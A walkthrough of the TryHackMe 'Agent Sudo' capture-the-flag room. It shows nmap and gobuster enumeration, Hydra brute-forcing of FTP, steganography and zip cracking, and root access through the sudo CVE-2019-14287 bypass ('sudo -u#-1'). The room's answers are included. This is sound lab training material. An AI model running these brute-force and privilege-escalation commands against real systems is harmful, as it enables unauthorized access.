<p align="center">
<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=21&duration=3500&pause=800&center=true&vCenter=true&width=500&lines=Hello+i'm+TiXA%2C+Welcome+to+my+Repo+%F0%9F%92%96;Give+it+a+%E2%AD%90+and+share+it+with+friends!" alt="Typing SVG" /></a>
</p>

<p align="center">
  💻<B><u>THM : Agent Sudo</u></B> 💻<br>
   <b><u>Difficulty :</u> Easy ⭐</b><br>
   <b><u>Category :</u> Free ✔️</b><br>
  <b><u>Room link :</u> https://tryhackme.com/room/agentsudoctf</b><br>
  <br>
  <img src="https://i.imgur.com/fCY0Ajn.jpg">
</p>



**Welcome to another THM exclusive CTF room. You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. Have Fun!**

## Summary 📃
- [NMAP Scan](#nmap-scan-mag_right)
- [Website Enumeration](#website-enumeration-eyes)
  - [Gobuster Enumeration](#website-enumeration-eyes)
  - [Manual Enumeration](#website-enumeration-eyes)
  - [Questions / Answers : Enumerate](#website-enumeration-eyes)
- [FTP Bruteforce](#gobuster-scan-mag_right)
- [Steganography](#getting-a-shell-space_invader)
  - [Online / Offline Tools](#website-enumeration-eyes)
  - [Questions / Answers : Hash cracking and brute-force](#website-enumeration-eyes)
- [Finding Flags](#website-enumeration-eyes)
  - [SSH Connection](#website-enumeration-eyes)
  - [Image Search](#finding-ingredients-bookmark_tabs)
  - [Questions / Answers : Capture the user flag](#website-enumeration-eyes)
- [Privilege Escalation](#finding-ingredients-bookmark_tabs)
  - [Getting the root privilege](#website-enumeration-eyes)
  - [Questions / Answers : Privilege escalation](#website-enumeration-eyes)
- [Conclusion](#Conclusion)

## NMAP Scan :mag_right:

Let's associate the variable `IP` to the `target ip machine` to avoid typing this one when needed.
```
export IP=10.10.254.233
```
Typing $IP in the cmd will return:
```
10.10.254.233: this confirm that the ip was assigned to the variable
```
Let's make an nmap scan using the following cmd ```sudo nmap -sV -A $IP -oN nmapResults.txt```

```
$ sudo nmap -sV -A $IP -oN nmapResults.txt 
Nmap scan report for 10.10.254.233
Host is up (0.072s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   72.59 ms 10.8.0.1
2   69.47 ms 10.10.254.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 275.51 seconds

```


We notice the availability of a web & ftp servers, let's keep that for later to find out more informations.

## Website enumeration :computer:

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration :mag_right:

Let's run [Gobuster](https://github.com/OJ/gobuster) against the target to find useful files and directories on the website :  

`gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -X sh,txt,pdf,css,py,cgi,php,html,js`


```
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.233/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              ,sh,txt,pdf,css,py,cgi,php,html,js
[+] Timeout:                 10s
===============================================================
2023/02/14 13:41:17 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 218]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 218]
/.html                (Status: 403) [Size: 278]
===============================================================
2023/02/14 13:41:17 Finished
===============================================================
```

Let's visit the `/index.php` to get more informations.

### Manual enumeration :mag_right:

We can enumerate the website manually. Let's take a look to the `/index.php` page of the website :

From the message on the site we know that we have to use our `codename` as well as `user-agent` and in order to do that, you have the choice between:

1. Use Burp Suite to change the `user-agent` in manual mode or using an automatic method to test letters from `A - Z` under intruder (sniper mode ;) it's up to you)

2. With `curl` using the command `curl -A "Your User-Agent" -L Target_IP`

3. Use the [User-agent Switcher](https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/) plugin under Mozila Firefox to change the `User-Agent`.

To change my `user-agent`, I used `curl` using the following command `curl -A "Agent R" -L $IP` which gave me the following message:

 
![img](https://raw.githubusercontent.com/TiXADZ/Write-Ups-THM-CTFs/main/images/Agent_Sudo/8.PNG#center)

Nothing changes ... Hmmmm

So let's try with just `R` as `user-agent`

From this message we know that codenames are just letters. `R` doesn't seems to be valid! So let's try with other letters.

I tried with `A,B,` and when trying with `C` we got the following :


![img](https://raw.githubusercontent.com/TiXADZ/Write-Ups-THM-CTFs/main/images/Agent_Sudo/9.PNG#center)

Now, we have a username **`chris`** let's keep it for later and we also know from the message that he has weak credentials, so we can try to bruteforce other services accessible on the target machine with this username.


<details>
  <summary><b>Questions / Answers : Enumerate</b></summary>

Question : How many open ports ?  
Answer : 3

Question : How you redirect yourself to a secret page?
Answer : User-Agent

Question : What is the agent name?
Answer : chris 

</details>

## FTP Bruteforce :bomb:

Let's try to bruteforce FTP using [Hydra](https://github.com/vanhauser-thc/thc-hydra) with the username `chris` using the following command:  

`hydra -l username -P /usr/share/wordlists/rockyou.txt Target_IP ftp`

`hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp`

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-14 14:00:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.254.233:21/
[21][ftp] host: 10.10.254.233   login: chris   password: crystal 
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-14 14:01:16

```

We successfully bruteforce user `chris` on FTP. Let's log in to the FTP service with the credentials `chris:crystal` we just found :  

```
$ ftp $IP         
Connected to 10.10.254.233.
220 (vsFTPd 3.0.3)
Name (10.10.254.233:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.

```
Let's download and take a look to those files on our machine! 

- Manually, one by one :

1. Log into the FTP server.
2. cd to the directory where you want to download the files.
3. cd to the directory whose content you want to download.
4. Now use `get file1` then `get file2` ... as follow :

```
ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png
```

- Or you can follow this steps for downloading multiple files using `MGET`:

1. Log into the FTP server.
2. cd to the directory where you want to download the files.
3. cd to the directory whose content you want to download.
4. Now use `mget` command as follow :
```
mget filename(s) – for multiple files
mget * — for complete directory
```
```
ftp> ls -la
229 Entering Extended Passive Mode (|||13889|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||12588|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***************************************************************************************************************|   217       72.17 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (2.89 KiB/s)
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||52492|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***************************************************************************************************************| 33143      211.44 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (145.23 KiB/s)
mget cutie.png [anpqy?]? y
229 Entering Extended Passive Mode (|||18765|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***************************************************************************************************************| 34842      212.27 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (142.92 KiB/s)
```

Let's take a look at `To_agentJ.txt` :  

```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ ls
cute-alien.jpg  cutie.png  To_agentJ.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ cat To_agentJ.txt     
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```
Hmmm interesting let's take a closer look at the other files.

## Steganography :microscope:

For that we can use:

- Online tools :  [futureboy-stegano](http://futureboy.us/stegano/decinput.html) for decoding payloads in JPEG,WAV or AU files.

- Offline tools : [stegseek](https://github.com/RickdeJager/stegseek) `stegseek image.jpg`, [steghide](https://github.com/StefanoDeVuono/steghide) `steghide extract -sf [file]` or [binwalk](https://github.com/ReFirmLabs/binwalk) `binwalk -e image.png` to extract hidden content.

**Note:** You can use `stegseek` to bruteforce & extract the passphrase or `binwalk` to extract the hidden data when `steghide` fail into.


We know that there are hidden data in the images we downloaded from the FTP. Let's use `steghide` to try to extract data from `cute-alien.jpg` :  

```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ steghide extract -sf cute-alien.jpg     
Enter passphrase: 
steghide: could not extract any data with that passphrase!

```
Hmmm we were unable to extract anything from it, cuz it need a passphrase.

We need a passphrase. We can use `stegseek` to try to bruteforce the passphrase and extract hidden data :  

```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ stegseek cute-alien.jpg              
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".

┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ ls
cute-alien.jpg  cute-alien.jpg.out  cutie.png  To_agentJ.txt

```

We successfully bruteforced the passphare of `cute-alien.jpg` which is `Area51` and `Stegseek` automatically extracted the hidden data. Let's take a look at `cute-alien.jpg.out` :  

```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We have the SSH password for user `chris` which is `hackerrules!` we will try to use those credentials for SSH later.

Now let's take a look at `cutie.png` file. Since it's a png file, it's not possible to hide data using `steghide` in it. So we can try to use `binwalk` to analyze the `cutie.png` :  

```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

There is an hidden Zip file in this image. We can use the `-e` option to extract the data with `binwalk` :  

```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ ls
cute-alien.jpg  cute-alien.jpg.out  cutie.png  _cutie.png.extracted  To_agentJ.txt

┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ftp]
└─$ cd _cutie.png.extracted 
                                                                                                                                                            
┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  To_agentR.txt

```

The `To_agentR.txt` file is empty. Let's try to extract the archive using [7zip](https://www.7-zip.org/download.html) :  

```
┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ 7z e 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 3600 6-Core Processor               (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 07:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 07:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
                    
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1

```

We need a password to extract the ZIP archive. Let's use `john` to crack this ZIP file :

1. Let's retrieve the hash `zip2john file.zip > hash.txt`

2. Let's use john to crack the ZIP file `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` 

```                                                                                              
┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ zip2john 8702.zip > hash.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ ls

365  365.zlib  8702.zip  hash.txt  To_agentR.txt

┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ john hash.txt /usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE 2/3 (2023-02-14 14:22) 0.7692g/s 34187p/s 34187c/s 34187C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We successfully cracked the ZIP archive password which is `alien` ! Let's extract the file using the password we just found and read the extracted file :  

```
┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ 7z e 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 3600 6-Core Processor               (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 07:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 07:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y
            
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280

┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ ls -lah
total 332K
drwxr-xr-x 2 kali kali 4.0K Feb 14 14:23 .
drwxr-xr-x 3 kali kali 4.0K Feb 14 14:15 ..
-rw-r--r-- 1 kali kali 273K Feb 14 14:15 365
-rw-r--r-- 1 kali kali  34K Feb 14 14:15 365.zlib
-rw-r--r-- 1 kali kali  280 Feb 14 14:15 8702.zip
-rw-r--r-- 1 kali kali  279 Feb 14 14:19 hash.txt
-rw-r--r-- 1 kali kali   86 Oct 29  2019 To_agentR.txt

```

Let's read the `To_agentR.txt` file:

```
┌──(kali㉿kali)-[~/…/CTFs/Agent_Sudo/ftp/_cutie.png.extracted]
└─$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

There is a strange message with somethings that seems to be a password `QXJlYTUx`under base64 encoding ? Let's check if it's `base64` I'm not sure 


`echo "QXJlYTUx" | base64 -d ` :arrow_right:  `Area51`


<details>
  <summary><b>Questions / Answers : Hash cracking and brute-force</b></summary>

Question : FTP password
Answer : crystal

Question : Zip file password
Answer : alien

Question : steg password
Answer : Area51

Question : Who is the other agent (in full name) ?  
Answer : james

Question : SSH password
Answer : hackerrules! 

</details>

### SSH Connection

Now let's connect to SSH as `james` using `hackerrules!` as password :  
```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ssh]
└─$ ssh james@$IP           
The authenticity of host '10.10.254.233 (10.10.254.233)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.254.233' (ED25519) to the list of known hosts.
james@10.10.254.233's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb 14 19:29:22 UTC 2023

  System load:  0.0               Processes:           98
  Usage of /:   39.8% of 9.78GB   Users logged in:     0
  Memory usage: 18%               IP address for eth0: 10.10.254.233
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 

```

Now let's get the user_flag.txt flag :  

```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
******************************
```

### Image search

First, let's try to answer to the question `What is the incident of the photo called ?`. So I downloaded the photo on my computer by using `scp user@server:/path/to/remotefile.zip /Local/Target/Destination` from my machine :  
```
┌──(kali㉿kali)-[~/TryHME/CTFs/Agent_Sudo/ssh]
└─$ scp james@$IP:/home/james/Alien_autospy.jpg ./

james@10.10.254.233's password: 
Alien_autospy.jpg                         100%   41KB  89.6KB/s   00:00  
```

Now that I have the file on my computer, I can make a reverse image search to find out what informations we can get from this image :  


<details>
  <summary><b>Clique here to see the image</b></summary>

![img](https://raw.githubusercontent.com/TiXADZ/Write-Ups-THM-CTFs/main/images/Agent_Sudo/10.PNG#center)

</details></br> 
<!-- empty line *️⃣  -->

So we are searching for **"Roswell incident"**  

An Alien autopsy is mentionned and it looks like the image found in `james` home directory is an image from this Alien Autopsy.

We have the answer ! 


Capture the user flag 


<details>
  <summary><b>Questions / Answers : Capture the user flag</b></summary>

Question : What is the user flag?
Answer : ************************

Question : What is the incident of the photo called ?
Answer : Roswell Alien Autopsy 

</details></br>

## Privilege Escalation :chart_with_upwards_trend:

I tried several privilege escalation methods and ended using one that is `sudo-based`

### Getting the root privilege


If we look at the sudo version, we will see it is outdated :  
```
sudo --version

james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Let's search for exploits for this sudo version on [Exploit-DB - sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502) 

![img](https://raw.githubusercontent.com/TiXADZ/Write-Ups-THM-CTFs/main/images/Agent_Sudo/1.PNG#center)  

This exploit is for sudo version before 1.8.28 so it may work on the target. Let's try it :  
```
sudo -u#-1 /bin/bash
id -- to confirm that we are root
```

And we are **root !** Let's get the root flag :

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
*****************************
By,
DesKel a.k.a Agent R

```

<details>
  <summary><b>Questions / Answers : Privilege escalation</b></summary>

Question : CVE number for the escalation (Format: CVE-xxxx-xxxx)
Answer : CVE-2019-14287 

Question : What is the root flag?
Answer : ************************

Question : (Bonus) Who is Agent R? 
Answer : DesKel 

</details>

## Conclusion 

As on most CTFs, here are some steps I follow:

- The first thing I do is list the services using nmap and I note the services that could be useful to me later.

- I list the directories of the web server if it exists using Gobuster or other.

- I visit the website to get as much information as possible that could be helpful later by doing a manual enumeration.

- I regroup all the previous informations and access to the target machine.

- I try to escalate privileges by exploiting a vulnerability and answers to all the requested questions.

This room was very cool and was very varied. There was some cracking using `john`, brute-force using `hydra`, steganography using `steghide` , `stegseek` and `binwalk`.

Thanks for this room and thanks for reading my write ups !


<p align="center">
<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=21&duration=3500&pause=2600&center=true&vCenter=true&multiline=true&width=550&height=80&lines=✨+Made+with+%F0%9F%92%96+If+you+like+this+project%2C+;give+it+a+%E2%AD%90+and+share+it+with+friends!+✨" alt="Typing SVG" /></a>
<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=21&duration=3500&pause=2000&center=true&vCenter=true&multiline=true&width=500&height=80&lines=✨+Thanks+for+reading+my+write+ups+✨" alt="Typing SVG" /></a>
</p>

##

<u>**My networks :**</u> 

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/nazim-hamaoui/)      [![Tryhackme](https://i.imgur.com/gLYq8Bm.png)](https://tryhackme.com/p/TiXA)
